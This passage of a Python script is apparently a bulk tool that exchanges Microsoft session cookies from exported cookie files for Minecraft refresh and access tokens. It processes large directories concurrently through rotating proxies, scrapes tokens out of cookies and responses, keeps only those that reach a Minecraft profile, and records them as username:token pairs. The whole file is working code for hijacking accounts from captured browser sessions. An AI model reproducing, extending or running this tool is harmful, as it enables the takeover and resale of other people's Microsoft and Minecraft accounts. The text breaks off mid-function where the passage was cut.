"""
Cookie to Access Token Extractor
Exchanges Microsoft login.live.com session cookies (Netscape format .txt)
for Minecraft tokens via the full MSA -> XBL -> XSTS -> Minecraft chain.

Every cookie file is asked for a refresh token first. When a file cannot
produce a usable refresh token the script falls back to a Minecraft access
token, and files that produced nothing are remembered so they are not scanned
again on later runs.

A token is only kept when it resolves to a real Minecraft username: the full
MSA -> XBL -> XSTS chain is followed and the resulting account is checked
against the Minecraft profile API. Working Microsoft credentials for an account
that does not own Minecraft are dropped, so refresh.txt/token.txt only ever
hold tokens that actually reach Minecraft.

Output files (written in the working directory):
  refresh.txt            valid MSA refresh tokens, one per line
  token.txt              Minecraft access tokens, one per line
  validated_refresh.txt  validated refresh tokens, as username:token
  validated_access.txt   validated access tokens, as username:token
  results.txt            per-cookie-file outcome (which file succeeded or failed)
  found_tokens.txt       cookie files that reached a Minecraft account (skipped next run)
  no_tokens.txt          cookie files that produced no Minecraft account (skipped next run)

Large directories are handled concurrently: several cookie files are in flight
at once, HTTP connections are reused, the console shows one line per file and
the full per-file trace goes to cookie_to_token_log_<timestamp>.txt.

Useful flags: --dir, --recursive, --concurrency, --timeout, --limit, --verbose.
"""

import os
import sys
import time
import asyncio
import argparse
import hashlib
import base64
import secrets
import re
import json
import traceback
from contextlib import asynccontextmanager
from dataclasses import dataclass
from datetime import datetime
from urllib.parse import urlencode, urlparse, parse_qs

import httpx
from proxy_utils import choose_proxies

# --- Constants ---

LIVE_CONNECT_AUTHORIZE_URL = "https://login.live.com/oauth20_authorize.srf"
LIVE_CONNECT_TOKEN_URL = "https://login.live.com/oauth20_token.srf"
LIVE_CONNECT_DESKTOP_REDIRECT_URI = "https://login.live.com/oauth20_desktop.srf"
MINECRAFT_LAUNCHER_V1_CLIENT_ID = "00000000402b5328"
LIVE_CONNECT_SCOPE_MBI_SSL = "service::user.auth.xboxlive.com::MBI_SSL"

XBL_AUTH_URL = "https://user.auth.xboxlive.com/user/authenticate"
XSTS_AUTH_URL = "https://xsts.auth.xboxlive.com/xsts/authorize"
MC_LOGIN_WITH_XBOX_URL = "https://api.minecraftservices.com/authentication/login_with_xbox"
MC_PROFILE_URL = "https://api.minecraftservices.com/minecraft/profile"
MC_SESSIONSERVER_URL = "https://sessionserver.mojang.com/session/minecraft/profile/{uuid}"

DEFAULT_USER_AGENT = (
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
    "AppleWebKit/537.36 (KHTML, like Gecko) "
    "Chrome/124.0.0.0 Safari/537.36"
)

# --- Output files and remembered state ---

ACCESS_OUTPUT_NAME = "token.txt"
REFRESH_OUTPUT_NAME = "refresh.txt"
VALIDATED_ACCESS_NAME = "validated_access.txt"
VALIDATED_REFRESH_NAME = "validated_refresh.txt"
RESULTS_NAME = "results.txt"
FOUND_STATE_NAME = "found_tokens.txt"
EMPTY_STATE_NAME = "no_tokens.txt"

# Files this tool reads or writes that must never be scanned as cookie input.
INTERNAL_FILES = {
    ACCESS_OUTPUT_NAME,
    REFRESH_OUTPUT_NAME,
    VALIDATED_ACCESS_NAME,
    VALIDATED_REFRESH_NAME,
    RESULTS_NAME,
    FOUND_STATE_NAME,
    EMPTY_STATE_NAME,
    "requirements.txt",
    "proxy.txt",
    "proxies.txt",
}
INTERNAL_PREFIXES = (
    "rotated_refresh_", "validated_refresh_", "validated_access_",
    "validated_tokens_", "rejected_refresh_", "rejected_tokens_",
    "verbose_", "cookie_to_token_log_",
)
LOG_PREFIX = "cookie_to_token_log_"

# Per-file outcome labels used in results.txt. Only OK_REFRESH and OK_ACCESS
# mean the file reached a real Minecraft account; everything else is dropped.
STATUS_REFRESH = "OK_REFRESH"          # refresh token that resolves to a Minecraft account
STATUS_ACCESS = "OK_ACCESS"            # access token that resolves to a Minecraft account
STATUS_NO_MINECRAFT = "NO_MINECRAFT"   # credentials work, but the account owns no Minecraft
STATUS_INVALID = "INVALID"             # the Minecraft API rejected the token
STATUS_FAIL = "FAIL"                   # the file produced no usable token at all
STATUS_EMPTY = "EMPTY"                 # the file is not a cookie export
STATUS_ERROR = "ERROR"                 # request error; retried on the next run

# The order statuses are summarised in.
STATUS_ORDER = (
    STATUS_REFRESH, STATUS_ACCESS, STATUS_NO_MINECRAFT,
    STATUS_INVALID, STATUS_FAIL, STATUS_EMPTY, STATUS_ERROR,
)

STATUS_MARKERS = {
    STATUS_REFRESH: "+",
    STATUS_ACCESS: "~",
    STATUS_NO_MINECRAFT: "o",
    STATUS_INVALID: "x",
    STATUS_FAIL: "-",
    STATUS_EMPTY: ".",
    STATUS_ERROR: "!",
}

# Usernames that are worth trusting as a real Minecraft account.
MC_USERNAME_RE = re.compile(r"^[A-Za-z0-9_]{3,16}$")

# Bulk-run tuning
DEFAULT_CONCURRENCY = 24
PROXY_ATTEMPTS = 3

# Guards against a huge non-cookie file being parsed or scanned for tokens.
MAX_SCAN_CHARS = 20_000          # longest single cookie value that is scanned
MAX_BODY_SCAN_CHARS = 500_000    # longest response body that is scanned for JWTs

# --- Helpers ---

def parse_netscape_cookies(filepath: str) -> list[dict]:
    cookies = []
    with open(filepath, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            if line.startswith("#HttpOnly_"):
                # Netscape marks HttpOnly cookies with a "#HttpOnly_" prefix on
                # the domain column; the cookie itself is still valid.
                line = line[len("#HttpOnly_"):]
            elif line.startswith("#"):
                continue
            parts = line.split("\t")
            if len(parts) < 7:
                continue
            domain, _flag, path, _secure, _expires, name, value = parts[:7]
            cookies.append({"name": name, "value": value, "domain": domain, "path": path})
    return cookies


def is_internal_file(filename: str) -> bool:
    """True for files this tool writes or reads as helpers, never cookie input."""
    lower = filename.lower()
    return lower in INTERNAL_FILES or lower.startswith(INTERNAL_PREFIXES)


def find_cookie_files(directory: str, recursive: bool = False) -> list[str]:
    found = []
    if recursive:
        for root, _dirs, files in os.walk(directory):
            for name in files:
                if name.lower().endswith(".txt") and not is_internal_file(name):
                    found.append(os.path.join(root, name))
    else:
        for name in os.listdir(directory):
            path = os.path.join(directory, name)
            if (
                name.lower().endswith(".txt")
                and not is_internal_file(name)
                and os.path.isfile(path)
            ):
                found.append(path)
    return sorted(found, key=str.lower)


# --- Remembered state: which cookie files were already handled ---

def read_name_set(path: str) -> set[str]:
    """Read a one-file-name-per-line state file, ignoring comments."""
    names: set[str] = set()
    if not os.path.isfile(path):
        return names
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            names.add(os.path.basename(line))
    return names


def write_name_set(path: str, names: set[str], header: str) -> None:
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"# {header}\n")
        for name in sorted(names, key=str.lower):
            f.write(name + "\n")


# --- Per-file result report ---

def read_results(path: str) -> dict[str, tuple[str, str]]:
    """Read results.txt back into {cookie file: (status, detail)}."""
    results: dict[str, tuple[str, str]] = {}
    if not os.path.isfile(path):
        return results
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        for line in f:
            line = line.rstrip("\n")
            if not line.strip() or line.lstrip().startswith("#"):
                continue
            parts = [part.strip() for part in line.split("\t")]
            if len(parts) < 2:
                continue
            detail = parts[2] if len(parts) > 2 else ""
            results[os.path.basename(parts[1])] = (parts[0], detail)
    return results


def write_results(path: str, results: dict[str, tuple[str, str]]) -> None:
    counts: dict[str, int] = {}
    for status, _detail in results.values():
        counts[status] = counts.get(status, 0) + 1
    summary = ", ".join(
        f"{counts[status]} {status}"
        for status in STATUS_ORDER
        if status in counts
    )
    with open(path, "w", encoding="utf-8") as f:
        f.write(f"# cookie_to_token.py results - updated {datetime.now():%Y-%m-%d %H:%M:%S}\n")
        f.write("# format: status<TAB>cookie file<TAB>detail\n")
        f.write(
            f"# {STATUS_REFRESH}=Minecraft account via refresh token, "
            f"{STATUS_ACCESS}=Minecraft account via access token, "
            f"{STATUS_NO_MINECRAFT}=no Minecraft profile on the account, "
            f"{STATUS_INVALID}=token rejected by the Minecraft API, "
            f"{STATUS_FAIL}=no usable token, {STATUS_EMPTY}=not a cookie file, "
            f"{STATUS_ERROR}=request error (retried next run)\n"
        )
        for name in sorted(results, key=str.lower):
            status, detail = results[name]
            f.write(f"{status}\t{name}\t{detail or '-'}\n")
        f.write(f"# summary: {len(results)} file(s) - {summary or 'none'}\n")


# --- Token file helpers ---

def read_lines(path: str) -> list[str]:
    if not os.path.isfile(path):
        return []
    with open(path, "r", encoding="utf-8", errors="replace") as f:
        return [line.strip() for line in f if line.strip()]


def read_validated_tokens(path: str) -> set[str]:
    """Token values already present in a validated_refresh/access file.

    Those files are written as ``username:token``, so only the token part takes
    part in the dedupe.
    """
    tokens: set[str] = set()
    for line in read_lines(path):
        if line.startswith("#"):
            continue
        _label, separator, token = line.rpartition(":")
        tokens.add(token if separator else line)
    return tokens


def store_token(value: str | None, seen: set[str], handle) -> bool:
    """Append a token once and flush it; True when it was newly written."""
    if not value or value in seen:
        return False
    seen.add(value)
    handle.write(value + "\n")
    handle.flush()
    return True


def store_validated_token(
    username: str,
    value: str | None,
    seen: set[str],
    handle,
) -> bool:
    """Append a validated ``username:token`` line once; True when newly written.

    This mirrors how validate_tokens.py exports its validated_refresh_*.txt and
    validated_tokens_*.txt files.
    """
    if not username or not value or value in seen:
        return False
    seen.add(value)
    handle.write(f"{username}:{value}\n")
    handle.flush()
    return True


# --- Reusable HTTP clients ---

@asynccontextmanager
async def http_client(
    proxy: str | None,
    client: httpx.AsyncClient | None = None,
    timeout: float = 30.0,
):
    """Reuse the caller's client when given, otherwise make a throwaway one."""
    if client is not None:
        yield client
        return
    async with httpx.AsyncClient(
        timeout=timeout, proxy=proxy, follow_redirects=False
    ) as owned:
        yield owned


class ClientCache:
    """One long-lived httpx client per proxy so TLS connections are reused.

    Creating a client per request (the old behaviour) forced a fresh TCP +
    TLS handshake for every step of every file, which dominates the runtime
    when thousands of files are scanned.
    """

    def __init__(self, timeout: float = 20.0, max_connections: int = 0):
        self._timeout = timeout
        self._max_connections = max_connections
        self._clients: dict[str, httpx.AsyncClient] = {}

    def get(self, proxy: str | None) -> httpx.AsyncClient:
        key = proxy or ""
        client = self._clients.get(key)
        if client is None:
            client = httpx.AsyncClient(
                timeout=httpx.Timeout(self._timeout),
                proxy=proxy,
                follow_redirects=False,
                limits=httpx.Limits(
                    max_connections=self._max_connections or None,
                    max_keepalive_connections=self._max_connections or None,
                ),
            )
            self._clients[key] = client
        return client

    async def aclose(self) -> None:
        for client in self._clients.values():
            try:
                await client.aclose()
            except Exception:
                pass
        self._clients.clear()


class ProxyRotator:
    """Round-robin proxy picker that reuses proxies across a bulk run.

    ProxyPool claims each proxy only once per run, which is fine for a handful
    of files but leaves every later file on a direct connection when a run is
    thousands of files long. This rotator keeps cycling, skipping only the
    proxies that failed their transport.
    """

    def __init__(self, proxies: list[str]):
        self.proxies = list(proxies)
        self.failed: set[str] = set()
        self._cursor = 0

    def next(self) -> str | None:
        if not self.proxies:
            return None
        if len(self.failed) >= len(self.proxies):
            # Everything is quarantined: start a fresh cycle rather than
            # silently falling back to an unproxied connection.
            self.failed.clear()
        for _ in range(len(self.proxies)):
            proxy = self.proxies[self._cursor % len(self.proxies)]
            self._cursor += 1
            if proxy not in self.failed:
                return proxy
        return self.proxies[0]

    def mark_failed(self, proxy: str | None) -> None:
        if proxy:
            self.failed.add(proxy)


async def run_with_proxy_retries(rotator: ProxyRotator, operation, attempts: int = PROXY_ATTEMPTS):
    """Run an operation, retrying on transport failures via another proxy."""
    last_error: Exception | None = None
    for _attempt in range(attempts):
        proxy = rotator.next()
        try:
            return await operation(proxy)
        except (httpx.TransportError, asyncio.TimeoutError) as exc:
            rotator.mark_failed(proxy)
            last_error = exc
    if last_error:
        raise last_error
    return None


def build_cookie_header(cookies: list[dict]) -> str:
    return "; ".join(f"{c['name']}={c['value']}" for c in cookies)


def make_pkce() -> tuple[str, str]:
    verifier = secrets.token_urlsafe(64)[:128]
    digest = hashlib.sha256(verifier.encode("ascii")).digest()
    challenge = base64.urlsafe_b64encode(digest).rstrip(b"=").decode("ascii")
    return verifier, challenge


def extract_code_from_location(location: str) -> str | None:
    parsed = urlparse(location)
    params = parse_qs(parsed.query)
    codes = params.get("code", [])
    return codes[0] if codes else None



def describe_authorize_response(resp: httpx.Response) -> None:
    """Print safe diagnostics without exposing cookies, tokens, or page contents."""
    content_type = resp.headers.get("content-type", "")
    location = resp.headers.get("location", "")
    body = resp.text[:200_000]
    title_match = re.search(r"<title[^>]*>\s*(.*?)\s*</title>", body, re.I | re.S)
    title = re.sub(r"\s+", " ", title_match.group(1)).strip() if title_match else "(none)"
    indicators = {
        "sign-in page": r"sign.?in|登录|iniciar sesión|se connecter",
        "account selection": r"pick an account|select an account|choose an account",
        "captcha/challenge": r"captcha|challenge|proof.?up|verify you.?re human|robot",
        "authorization error": r"error=|unauthorized|access denied|request denied",
    }
    matches = [name for name, pattern in indicators.items() if re.search(pattern, body, re.I)]

    print(f"    Response URL: {resp.url}")
    print(f"    Content-Type: {content_type or '(missing)'}")
    print(f"    Body size: {len(resp.content)} bytes")
    print(f"    Location header: {'present' if location else 'missing'}")
    print(f"    Page title: {title[:160]}")
    print(f"    Detected indicators: {', '.join(matches) if matches else '(none)'}")
# --- Step 1: Get MSA token from cookies ---

async def get_msa_token(
    cookies: list[dict],
    cookie_header: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> tuple[str | None, str | None, str | None]:
    """Exchange session cookies for an MSA access_token + refresh_token (v1 flow).

    Returns (access_token, refresh_token, failure_body). On success failure_body
    is None. On failure both tokens are None and failure_body holds the last
    response text so the caller can try to salvage an access token anyway.
    """
    verifier, challenge = make_pkce()
    uaid = next((c['value'] for c in cookies if c['name'] == 'uaid'), None)

    params = {
        "client_id": MINECRAFT_LAUNCHER_V1_CLIENT_ID,
        "redirect_uri": LIVE_CONNECT_DESKTOP_REDIRECT_URI,
        "response_type": "code",
        "scope": LIVE_CONNECT_SCOPE_MBI_SSL,
        "code_challenge": challenge,
        "code_challenge_method": "S256",
        # Compatibility parameters used by the Minecraft launcher client.
        "display": "touch",
        "locale": "en",
        "lw": "1",
        "fl": "dob,easi2",
        "xsup": "1",
        "nopa": "2",
    }
    if uaid:
        params["uaid"] = uaid
    authorize_url = f"{LIVE_CONNECT_AUTHORIZE_URL}?{urlencode(params)}"

    async with http_client(proxy, client) as client:
        print("[1/5] GET authorize (v1)...")
        resp = await client.get(authorize_url, headers={"Cookie": cookie_header, "User-Agent": DEFAULT_USER_AGENT})

        if resp.status_code != 302:
            print(f"[-] Authorize returned {resp.status_code} (expected 302)")
            describe_authorize_response(resp)
            return None, None, resp.text

        location = resp.headers.get("location", "")
        code = extract_code_from_location(location)
        if not code:
            m = re.search(r'[?&]code=([^&]+)', location)
            code = m.group(1) if m else None
        if not code:
            print(f"[-] No code in redirect")
            return None, None, resp.text

        print(f"[*]  Got code ({len(code)} chars), exchanging...")

        token_resp = await client.post(
            LIVE_CONNECT_TOKEN_URL,
            data={
                "client_id": MINECRAFT_LAUNCHER_V1_CLIENT_ID,
                "code": code,
                "grant_type": "authorization_code",
                "redirect_uri": LIVE_CONNECT_DESKTOP_REDIRECT_URI,
                "code_verifier": verifier,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": DEFAULT_USER_AGENT},
        )

        if token_resp.status_code != 200:
            print(f"[-] Token exchange returned {token_resp.status_code}")
            return None, None, token_resp.text

        data = token_resp.json()
        access_token = data.get("access_token")
        refresh_token = data.get("refresh_token")
        if access_token:
            print(f"[+] MSA access_token obtained ({len(access_token)} chars)")
            if refresh_token:
                print(f"[+] MSA refresh_token obtained ({len(refresh_token)} chars)")
            return access_token, refresh_token, None

        print("[-] No access_token in response")
        return None, None, token_resp.text


# --- Refresh-token check: the preferred result ---

async def verify_refresh_token(
    refresh_token: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> tuple[str, str] | None:
    """Prove a refresh token really works by trading it for an MSA access token.

    Returns (msa_access_token, refresh_token) - the returned refresh token is
    the rotated one Microsoft issues - or None when the token is rejected.
    """
    async with http_client(proxy, client) as client:
        print("[*]  Verifying refresh token (refresh_token grant)...")
        resp = await client.post(
            LIVE_CONNECT_TOKEN_URL,
            data={
                "client_id": MINECRAFT_LAUNCHER_V1_CLIENT_ID,
                "refresh_token": refresh_token,
                "grant_type": "refresh_token",
                "redirect_uri": LIVE_CONNECT_DESKTOP_REDIRECT_URI,
                "scope": LIVE_CONNECT_SCOPE_MBI_SSL,
            },
            headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": DEFAULT_USER_AGENT},
        )

        if resp.status_code != 200:
            print(f"[-] Refresh grant returned {resp.status_code}: {resp.text[:200]}")
            return None

        data = resp.json()
        access_token = data.get("access_token")
        if not access_token:
            print(f"[-] Refresh grant returned no access_token. Keys: {list(data.keys())}")
            return None

        rotated = data.get("refresh_token") or refresh_token
        print(f"[+] Refresh token is valid ({len(refresh_token)} chars)")
        if data.get("refresh_token"):
            print(f"[*] Rotated refresh_token issued ({len(rotated)} chars)")
        return access_token, rotated


# --- Step 2: XBL authenticate ---

async def authenticate_xbl(
    msa_token: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> tuple[str, str] | None:
    """Exchange MSA token for Xbox Live token. Returns (token, userhash)."""
    # v1 Live-Connect opaque tokens (Ew...) need t= prefix
    # v2 Azure AD JWT tokens (eyJ...) need d= prefix
    if msa_token.startswith("eyJ"):
        msa_token = f"d={msa_token}"
    elif not msa_token.startswith("t=") and not msa_token.startswith("d="):
        msa_token = f"t={msa_token}"

    payload = {
        "Properties": {
            "AuthMethod": "RPS",
            "SiteName": "user.auth.xboxlive.com",
            "RpsTicket": msa_token,
        },
        "RelyingParty": "http://auth.xboxlive.com",
        "TokenType": "JWT",
    }

    async with http_client(proxy, client) as client:
        print("[2/5] Authenticating with XBL...")
        resp = await client.post(
            XBL_AUTH_URL,
            json=payload,
            headers={"Accept": "application/json", "x-xbl-contract-version": "1"},
        )

        if resp.status_code != 200:
            print(f"[-] XBL returned {resp.status_code}: {resp.text[:300]}")
            return None

        data = resp.json()
        token = data.get("Token")
        userhash = data.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs", "")

        if token and userhash:
            print(f"[+] XBL token obtained ({len(token)} chars), userhash={userhash}")
            return token, userhash

        print(f"[-] XBL response missing Token/uhs. Keys: {list(data.keys())}")
        return None


# --- Step 3: XSTS authorize ---

async def authenticate_xsts(
    xbl_token: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> tuple[str, str] | None:
    """Exchange XBL token for XSTS token. Returns (token, userhash)."""
    payload = {
        "Properties": {
            "SandboxId": "RETAIL",
            "UserTokens": [xbl_token],
        },
        "RelyingParty": "rp://api.minecraftservices.com/",
        "TokenType": "JWT",
    }

    async with http_client(proxy, client) as client:
        print("[3/5] Authenticating with XSTS...")
        resp = await client.post(
            XSTS_AUTH_URL,
            json=payload,
            headers={"Accept": "application/json", "x-xbl-contract-version": "1"},
        )

        if resp.status_code != 200:
            print(f"[-] XSTS returned {resp.status_code}: {resp.text[:500]}")
            # Try to parse XSTS error
            try:
                err = resp.json()
                xerr = err.get("XErr", "?")
                msg = err.get("Message", "")
                print(f"    XErr={xerr} {msg}")
                if xerr == 2148916233:
                    print("    (No Xbox account linked to this Microsoft account)")
                elif xerr == 2148916238:
                    print("    (Child account requires adult approval)")
            except Exception:
                pass
            return None

        data = resp.json()
        token = data.get("Token")
        userhash = data.get("DisplayClaims", {}).get("xui", [{}])[0].get("uhs", "")

        if token and userhash:
            print(f"[+] XSTS token obtained ({len(token)} chars)")
            return token, userhash

        print(f"[-] XSTS response missing Token/uhs")
        return None


# --- Step 4: Minecraft login_with_xbox ---

async def minecraft_login(
    userhash: str,
    xsts_token: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> str | None:
    """Exchange XSTS for Minecraft access token (JWT, eyJra...)."""
    identity_token = f"XBL3.0 x={userhash};{xsts_token}"

    async with http_client(proxy, client) as client:
        print("[4/5] Logging into Minecraft...")
        resp = await client.post(
            MC_LOGIN_WITH_XBOX_URL,
            json={"identityToken": identity_token},
            headers={"Accept": "application/json"},
        )

        if resp.status_code != 200:
            print(f"[-] Minecraft login returned {resp.status_code}: {resp.text[:300]}")
            return None

        data = resp.json()
        access_token = data.get("access_token")
        if access_token and access_token.startswith("eyJ"):
            print(f"[+] Minecraft access_token obtained! eyJra... ({len(access_token)} chars)")
            return access_token

        print(f"[-] No valid Minecraft token. Keys: {list(data.keys())}")
        return None


# --- Access-token salvage when the authorize 302 fails ---

JWT_RE = re.compile(r"eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+")
REFRESH_TOKEN_RE = re.compile(r"M\.C[A-Za-z0-9]{3,}[A-Za-z0-9._\-]+")


def decode_jwt_payload(token: str) -> dict | None:
    """Decode the payload segment of a JWT without verifying the signature."""
    try:
        _header, payload, _signature = token.split(".")
        raw = base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4))
        return json.loads(raw)
    except Exception:
        return None


def looks_like_minecraft_jwt(token: str) -> bool:
    """True if the JWT claims look like a Minecraft access token."""
    claims = decode_jwt_payload(token)
    return bool(claims) and (claims.get("token_type") == "Minecraft" or "xuid" in claims)


def scan_cookies_for_jwt(cookies: list[dict]) -> list[str]:
    """Pull JWT-shaped values out of the cookie export (some exports include tokens)."""
    found = []
    for c in cookies:
        value = str(c.get("value", ""))
        if len(value) > MAX_SCAN_CHARS:
            continue
        found.extend(JWT_RE.findall(value))
    return found


def scan_body_for_jwt(body: str | None) -> list[str]:
    """Pull JWT-shaped values out of the failed authorize response body."""
    return JWT_RE.findall((body or "")[:MAX_BODY_SCAN_CHARS])


def scan_cookies_for_refresh_token(cookies: list[dict]) -> list[str]:
    """Pull refresh-token shaped values (M.C...) out of the cookie export."""
    found = []
    for c in cookies:
        value = str(c.get("value", ""))
        if len(value) > MAX_SCAN_CHARS:
            continue
        found.extend(REFRESH_TOKEN_RE.findall(value))
    return found


async def salvage_refresh_token(
    cookies: list[dict],
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> tuple[str, str] | None:
    """Look for a refresh token inside the cookie export and verify it."""
    for candidate in dict.fromkeys(scan_cookies_for_refresh_token(cookies)):
        verified = await verify_refresh_token(candidate, proxy, client)
        if verified:
            return verified
    return None


async def salvage_access_token(
    cookies: list[dict],
    failure_body: str | None,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> str | None:
    """When the authorize 302 failed, try to recover an access token from the
    cookie export itself or from the 200 response body.

    Prefers a JWT that already is a Minecraft access token (has xuid / claims
    token_type "Minecraft"); otherwise pushes candidates through the normal
    XBL -> XSTS -> Minecraft chain in case they are MSA tokens. Returns an
    access token or None.
    """
    candidates = []
    seen = set()
    for jwt in scan_cookies_for_jwt(cookies) + scan_body_for_jwt(failure_body):
        if jwt not in seen:
            seen.add(jwt)
            candidates.append(jwt)
    if not candidates:
        return None

    # 1) A JWT that is already a Minecraft access token
    for jwt in candidates:
        if looks_like_minecraft_jwt(jwt):
            print(f"[+] Salvaged Minecraft access_token directly from the cookies/response ({len(jwt)} chars)")
            return jwt

    # 2) Any other JWT through the normal chain (it may be an MSA token)
    for jwt in candidates:
        print(f"[*] Trying salvaged JWT through XBL -> XSTS -> Minecraft ({len(jwt)} chars)...")
        xbl = await authenticate_xbl(jwt, proxy, client)
        if not xbl:
            continue
        xsts = await authenticate_xsts(xbl[0], proxy, client)
        if not xsts:
            continue
        mc_token = await minecraft_login(xsts[1], xsts[0], proxy, client)
        if mc_token:
            print(f"[+] Salvaged access_token via the Xbox chain! ({len(mc_token)} chars)")
            return mc_token
    return None


# --- Minecraft account validation ---
# Ported from validate_tokens.py: a token only counts when it resolves to a real
# Minecraft username, so working Microsoft credentials for an account without
# Minecraft are never accepted.

def is_mc_username(name) -> bool:
    """True only for a plausible Minecraft username (3-16 letters/digits/underscore)."""
    if not name or not isinstance(name, str):
        return False
    return bool(MC_USERNAME_RE.match(name.strip()))


def profile_username(profile: dict | None) -> str:
    """Minecraft username from a profile payload, or '' when it is not usable."""
    if not profile:
        return ""
    name = profile.get("name")
    return name.strip() if is_mc_username(name) else ""


async def fetch_profile(
    access_token: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> tuple[dict | None, int]:
    """Minecraft profile (username, UUID, skins, capes) plus the HTTP status.

    The status matters: 404 means the token is fine but the account owns no
    Minecraft profile, while 401/403 means the token itself is dead.
    """
    async with http_client(proxy, client) as client:
        try:
            resp = await client.get(
                MC_PROFILE_URL,
                headers={"Authorization": f"Bearer {access_token}"},
            )
        except Exception:
            return None, 0
        if resp.status_code != 200:
            return None, resp.status_code
        try:
            return resp.json(), 200
        except Exception:
            return None, 200


async def confirm_username(
    uuid: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> str:
    """Independent public check: resolve a UUID to its current Java username.

    Never used to invalidate a token - the authenticated profile is
    authoritative - but it is worth knowing when the two disagree.
    """
    clean_uuid = (uuid or "").replace("-", "")
    if len(clean_uuid) != 32:
        return ""
    async with http_client(proxy, client) as client:
        try:
            resp = await client.get(MC_SESSIONSERVER_URL.format(uuid=clean_uuid))
            if resp.status_code == 200:
                return str(resp.json().get("name") or "")
        except Exception:
            pass
    return ""


def profile_failure_status(http_status: int) -> str:
    """Map a failed Minecraft profile lookup to a results.txt status."""
    if http_status in (401, 403):
        return STATUS_INVALID
    if http_status == 404:
        return STATUS_NO_MINECRAFT
    return STATUS_ERROR


def describe_profile_failure(http_status: int) -> str:
    """Human reason a Minecraft profile lookup did not yield a username."""
    if http_status in (401, 403):
        return "the Minecraft API rejected this access token"
    if http_status == 404:
        return "no Minecraft profile on this Microsoft account"
    if http_status == 0:
        return "the Minecraft profile request failed (network/proxy)"
    return f"the Minecraft profile request returned HTTP {http_status}"


async def msa_to_minecraft_token(
    msa_token: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> str | None:
    """Push an MSA access token through XBL -> XSTS -> Minecraft."""
    xbl = await authenticate_xbl(msa_token, proxy, client)
    if not xbl:
        return None
    xsts = await authenticate_xsts(xbl[0], proxy, client)
    if not xsts:
        return None
    return await minecraft_login(xsts[1], xsts[0], proxy, client)


async def validate_minecraft_account(
    access_token: str,
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> tuple[str, str, int, str, bool | None]:
    """Resolve the Minecraft account behind an access token.

    Returns (username, uuid, http_status, confirmed_name, name_confirmed). The
    username is '' when the token does not reach a real Minecraft profile, which
    is what makes the caller drop the tokens instead of saving them.
    """
    profile, http_status = await fetch_profile(access_token, proxy, client)
    name = profile_username(profile)
    if not name:
        return "", "", http_status, "", None

    uuid_ = str((profile or {}).get("id") or "")
    public_name = await confirm_username(uuid_, proxy, client)
    name_confirmed = public_name.lower() == name.lower() if public_name else None
    return name, uuid_, http_status, public_name, name_confirmed


# --- Full chain ---

@dataclass
class ExtractionResult:
    """What a single cookie file produced, after Minecraft validation.

    Only a file whose Minecraft account resolved has a non-empty username, and
    that is the single condition for saving the tokens and remembering the file.
    """
    refresh_token: str | None = None
    access_token: str | None = None
    status: str = STATUS_FAIL
    detail: str = "no valid refresh or access token"
    username: str = ""
    uuid: str = ""
    confirmed_name: str = ""
    name_confirmed: bool | None = None
    profile_status: int = 0

    @property
    def valid(self) -> bool:
        """True when the token was proven to belong to a Minecraft account."""
        return bool(self.username)


async def extract_tokens(
    cookies: list[dict],
    proxy: str | None = None,
    client: httpx.AsyncClient | None = None,
) -> ExtractionResult:
    """Extract a token from one cookie file and prove it reaches Minecraft.

    A refresh token is preferred, then a Minecraft access token. Either way the
    result is only handed back once the account has resolved to a real Minecraft
    username, so a working Microsoft login without Minecraft is not saved.
    """
    cookie_header = build_cookie_header(cookies)
    print(f"[*] Cookie header: {len(cookie_header)} chars, {len(cookies)} cookies")

    # Step 1: MSA token exchange from the session cookies
    msa, refresh_candidate, failure_body = await get_msa_token(cookies, cookie_header, proxy, client)

    # Step 2: a refresh token is the result we want, but only keep it once
    # Microsoft has confirmed it can actually be redeemed.
    refresh_token: str | None = None
    refresh_note = ""
    if refresh_candidate:
        verified = await verify_refresh_token(refresh_candidate, proxy, client)
        if verified:
            msa, refresh_token = verified
        else:
            refresh_note = "the session cookies produced a refresh token Microsoft rejected"
            print("[-] Refresh token was rejected; not saving it.")

    # Step 3: some exports already contain a refresh token value; try it too.
    if not refresh_token:
        salvaged_refresh = await salvage_refresh_token(cookies, proxy, client)
        if salvaged_refresh:
            salvaged_msa, refresh_token = salvaged_refresh
            refresh_note = ""
            if not msa:
                msa = salvaged_msa
            print("[+] Refresh token salvaged from the cookie export")

    # Step 4: Minecraft access token. Prefer the chain fed by the (fresh) MSA
    # token, then fall back to whatever the cookie export happens to contain.
    access_token: str | None = None
    if msa:
        access_token = await msa_to_minecraft_token(msa, proxy, client)
    if not access_token:
        print("[!] No Minecraft access token from the session - checking the cookies/response...")
        access_token = await salvage_access_token(cookies, failure_body, proxy, client)

    if not access_token:
        if refresh_token:
            status = STATUS_NO_MINECRAFT
            detail = "the refresh token is valid but the account did not reach Minecraft"
        elif refresh_note:
            status, detail = STATUS_FAIL, refresh_note
        else:
            status, detail = STATUS_FAIL, "no Minecraft access token could be obtained"
        print(f"[-] {detail}")
        return ExtractionResult(status=status, detail=detail)

    # Step 5: validation. The token only counts once it resolves to a real
    # Minecraft username, exactly like validate_tokens.py demands.
    username, uuid_, profile_status, confirmed_name, name_confirmed = (
        await validate_minecraft_account(access_token, proxy, client)
    )

    if not username:
